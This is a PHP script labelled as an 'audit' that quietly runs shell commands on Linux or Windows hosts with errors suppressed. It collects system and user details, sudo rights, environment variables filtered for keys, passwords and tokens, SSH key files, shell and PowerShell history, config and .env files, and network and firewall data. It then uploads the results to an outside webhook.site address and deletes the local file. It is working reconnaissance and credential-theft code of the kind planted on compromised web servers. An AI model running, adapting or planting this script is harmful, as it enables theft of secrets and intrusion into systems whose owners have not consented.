<?php
// 1. Error Suppression & Execution Timeouts
error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(120); // Allow up to 2 minutes for the audit to complete
@ignore_user_abort(true); 

$remote_url = "https://webhook.site/1baab802-ba9e-465d-bc3c-26335270a89a";
$os = PHP_OS_FAMILY;
$file = "audit_" . gethostname() . "_" . time() . ".txt";
$path = __DIR__ . DIRECTORY_SEPARATOR . $file;

function run($title, $cmd) {
    global $path;
    $out = "\n" . str_repeat("=", 60) . "\n" . $title . "\nCMD: " . $cmd . "\n" . str_repeat("=", 60) . "\n";
    
    if (function_exists('shell_exec')) {
        $res = @shell_exec($cmd . " 2>&1");
        $out .= $res ? trim($res) : "No output";
    } else {
        $out .= "shell_exec disabled";
    }
    @file_put_contents($path, $out . "\n", FILE_APPEND);
}

@file_put_contents($path, "AUDIT START: " . date('Y-m-d H:i:s') . "\n");

if ($os === 'Linux') {
    run("1. System Information", "hostname; uname -a; uname -m; uptime -p; date");
    run("2. User Context", "id; whoami; groups; sudo -l -n; w");
    run("3. Environment Variables", "printenv; echo \"PATH: \$PATH\"; printenv | grep -Ei 'key|secret|password|aws|db|database|url|token'");
    run("4. Network IPs", "hostname -I; ip addr");
    run("5. Open Ports", "ss -tuln || netstat -tuln");
    run("6. Active Connections", "ss -at || netstat -ant");
    run("7. DNS & Routing", "cat /etc/resolv.conf; ip route; ip neigh");
    run("8. Firewall Rules", "iptables -L -n || ufw status");
    run("9. Processes", "ps aux --sort=-%mem | head -n 50");
    run("10. Process Tree", "pstree -p || ps axjf | head -n 30");
    run("11. Services", "systemctl list-units --type=service --state=running --no-pager");
    run("12. Cron Jobs", "crontab -l; ls -la /etc/cron.*");
    run("13. Writable Directories", "find . /tmp -writable -type d 2>/dev/null | head -n 20");
    run("14. Config Files", "find . -maxdepth 3 -name '.env' -o -name 'config*' -o -name 'settings*' 2>/dev/null");
    run("15. Sensitive Files", "find ~/.ssh -type f 2>/dev/null; cat ~/.bash_history | tail -n 50");
    run("16. Logs & Backups", "ls -lh /var/log | head -n 20; find . -maxdepth 3 -name '*.bak' -o -name '*.backup' 2>/dev/null");
} else {
    run("1. System Information", "hostname && ver && systeminfo | findstr /B /C:\"OS\" /C:\"System Type\"");
    run("2. User Context", "whoami /all && whoami /priv");
    run("3. Environment Variables", "set && echo PATH: %PATH% && set | findstr /i \"key secret password aws db database url token\"");
    run("4. Logged Users", "qwinsta");
    run("5. Network Configuration", "ipconfig /all");
    run("6. Open Ports", "netstat -ano | findstr LISTENING");
    run("7. Active Connections", "netstat -an");
    run("8. Routing & ARP", "route print -4 && arp -a");
    run("9. Firewall", "netsh advfirewall show allprofiles");
    run("10. Processes", "tasklist /V");
    run("11. Services", "sc query state= all | findstr \"SERVICE_NAME STATE\"");
    run("12. Scheduled Tasks", "schtasks /query /fo TABLE /nh | more");
    run("13. Filesystem Info", "cd && dir /ad /w %TEMP%");
    run("14. Config Files", "dir /s /b .env web.config config.php");
    run("15. SSH & History", "dir /s /b %USERPROFILE%\\.ssh && type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
    run("16. Logs & Backups", "dir C:\\inetpub\\logs /s /b && dir /s /b *.bak *.backup");
}

if (@file_exists($path)) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $remote_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'file' => new CURLFile($path),
        'hostname' => gethostname()
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    // Connect timeout (time to reach server) and Total timeout
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    
    @curl_exec($ch);
    curl_close($ch);
    
    @unlink($path);
}

die();